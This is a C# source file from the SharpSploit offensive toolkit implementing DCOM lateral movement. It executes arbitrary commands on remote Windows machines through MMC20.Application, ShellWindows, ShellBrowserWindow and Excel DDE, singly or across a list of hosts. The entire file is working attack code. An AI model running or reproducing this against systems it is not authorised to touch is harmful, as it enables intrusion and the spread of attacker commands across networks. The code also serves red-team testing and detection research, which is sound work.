// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Linq;
using System.Reflection;
using System.Collections.Generic;

namespace SharpSploit.LateralMovement
{
    /// <summary>
    /// DCOM is a class for executing DCOM lateral movement techniques.
    /// </summary>
    public class DCOM
    {
        /// <summary>
        /// Execute a process on a remote system using various DCOM methods.
        /// </summary>
        /// <param name="ComputerName">ComputerName of remote system to execute process.</param>
        /// <param name="Command">Command to execute on remote system.</param>
        /// <param name="Parameters"></param>
        /// <param name="Directory"></param>
        /// <param name="Method">DCOM execution method to use. Defaults to MMC20.Application.</param>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <remarks>
        /// Credit for the DCOM lateral movement techniques goes to Matt Nelson (@enigma0x3). This is
        /// a port of Steve Borosh (rvrshell)'s Invoke-DCOM implementation available
        /// here: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1
        /// </remarks>
        public static bool DCOMExecute(string ComputerName, string Command, string Parameters = "", string Directory = "C:\\WINDOWS\\System32\\", DCOMMethod Method = DCOMMethod.MMC20_Application)
        {
            try
            {
                if (Method == DCOMMethod.MMC20_Application)
                {
                    Type ComType = Type.GetTypeFromProgID("MMC20.Application", ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);

                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object ActiveView = Document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, Document, null);
                    ActiveView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, ActiveView, new object[] { Command, Directory, Parameters, "7" });
                }
                else if (Method == DCOMMethod.ShellWindows)
                {
                    Type ComType = Type.GetTypeFromCLSID(CLSIDs[Method], ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);

                    object Item = RemoteComObject.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { });
                    object Document = Item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, Item, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, Directory, null, 0 });
                }
                else if (Method == DCOMMethod.ShellBrowserWindow)
                {
                    Type ComType = Type.GetTypeFromCLSID(CLSIDs[Method], ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);

                    object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
                    object Application = Document.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, Document, null);
                    Application.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, Directory, null, 0 });
                }
                else if (Method == DCOMMethod.ExcelDDE)
                {
                    Type ComType = Type.GetTypeFromProgID("Excel.Application", ComputerName);
                    object RemoteComObject = Activator.CreateInstance(ComType);
                    RemoteComObject.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, RemoteComObject, new object[] { false });
                    RemoteComObject.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { Command, Parameters });
                }
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("DCOM Failed: " + e.Message);
            }
            return false;
        }

        /// <summary>
        /// Execute a process on a remote system using various DCOM methods.
        /// </summary>
        /// <param name="ComputerNames">ComputerNames of remote systems to execute process.</param>
        /// <param name="Command">Command to execute on remote system.</param>
        /// <param name="Parameters"></param>
        /// <param name="Directory"></param>
        /// <param name="Method">DCOM execution method to use. Defaults to MMC20.Application.</param>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <remarks>
        /// Credit for the DCOM lateral movement techniques goes to Matt Nelson (@enigma0x3). This is
        /// a port of Steve Borosh (rvrshell)'s Invoke-DCOM implementation available
        /// here: https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1
        /// </remarks>
        public static List<bool> DCOMExecute(List<string> ComputerNames, string Command, string Parameters = "", string Directory = "C:\\WINDOWS\\System32\\", DCOMMethod Method = DCOMMethod.MMC20_Application)
        {
            return ComputerNames.Select(CN => DCOMExecute(CN, Command, Parameters, Directory, Method)).ToList();
        }

        public enum DCOMMethod
        {
            MMC20_Application,
            ShellWindows,
            ShellBrowserWindow,
            ExcelDDE
        }

        private static readonly Dictionary<DCOMMethod, Guid> CLSIDs = new Dictionary<DCOMMethod, Guid>
        {
            { DCOMMethod.ShellWindows,          new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39") },
            { DCOMMethod.ShellBrowserWindow,    new Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880") }
        };
    }
}
